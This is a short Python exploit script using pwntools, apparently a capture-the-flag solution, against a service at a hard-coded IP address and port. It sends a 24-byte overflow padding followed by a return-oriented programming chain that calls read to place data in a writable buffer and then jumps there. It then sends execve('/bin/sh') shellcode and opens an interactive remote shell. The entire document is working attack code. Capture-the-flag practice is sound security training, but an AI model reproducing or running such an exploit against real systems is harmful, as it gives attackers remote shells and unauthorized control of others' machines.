#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwnpwnpwn import *
from pwn import *

host = "139.59.114.220"
port = 10001

context.arch = "amd64"
r = remote(host,port)
pop_rdi = 0x00000000004005c3
pop_rsi_r15 =0x00000000004005c1
read = 0x400400  
buf = 0x601528
payload = "a"*24 + flat([pop_rdi,0,pop_rsi_r15,buf,0,read,buf])
r.sendline(payload)

sc = "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"
r.sendline(sc)
r.interactive()
